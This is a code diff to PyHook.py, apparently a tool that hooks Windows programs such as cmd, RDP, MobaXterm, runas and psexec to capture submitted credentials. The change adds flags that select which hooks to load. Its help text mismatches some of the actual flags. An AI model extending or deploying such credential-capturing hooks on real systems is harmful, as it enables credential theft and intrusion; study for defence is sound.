@@ -4,11 +4,57 @@
 
 
 from __future__ import print_function
+
+import importlib
+from argparse import ArgumentParser, RawTextHelpFormatter
 from multiprocessing.pool import ThreadPool
 from typing import List
 from time import sleep
 import psutil
 import re
+
+
+example_text = '''example:
+
+python PyHook.py [-cmxrep]
+
+-c, --cmd          enable cmd hook.
+-m, --mstsc        enable mstsc hook.
+-x, --xterm        enable mobaxterm hook.
+-r, --runas        enable runas hook.
+-e, --explorer     enable explorer hook.
+-p, --psexec       enable psexec hook.
+
+No flags           enable all hooks'''
+
+
+def parse_args():
+    parser = ArgumentParser(epilog=example_text, formatter_class=RawTextHelpFormatter)
+    parser.add_argument('-c', '--cmd', action='store_true')
+    parser.add_argument('-r', '--rdp', action='store_true')
+    parser.add_argument('-x', '--mobaxterm', action='store_true')
+    parser.add_argument('-ru', '--runas', action='store_true')
+    parser.add_argument('-e', '--explorer', action='store_true')
+    parser.add_argument('-p', '--psexec', action='store_true')
+    args = vars(parser.parse_args())
+
+    no_hooks_selected = not any(args.values())
+    if no_hooks_selected:
+        for module in args.keys():
+            args[module] = True
+    return args
+
+
+def get_selected_hooks():
+    modules = []
+    for hook_process_name, hook_enabled in parse_args().items():
+        if hook_enabled:
+            try:
+                hook_module = importlib.import_module(f"hooks.{hook_process_name}")
+                modules.append(hook_module.wait_for)
+            except ModuleNotFoundError:
+                print(f"[-] A module for the selected process is not available - {hook_process_name}")
+    return modules
 
 
 def get_process_by_list_names(name_list: List[str]) -> List[psutil.Process]:
@@ -61,10 +107,7 @@ def on_credential_submit(message, data):
 
 
 def main():
-    from hooks import rdp, psexec, explorer, cmd, mobaxterm, runas
-
-    functions = [psexec.wait_for, rdp.wait_for, explorer.wait_for, cmd.wait_for, mobaxterm.wait_for, runas.wait_for]
-    run_thread_pool_for_functions(functions)
+    run_thread_pool_for_functions(get_selected_hooks())
 
 
 if __name__ == "__main__":
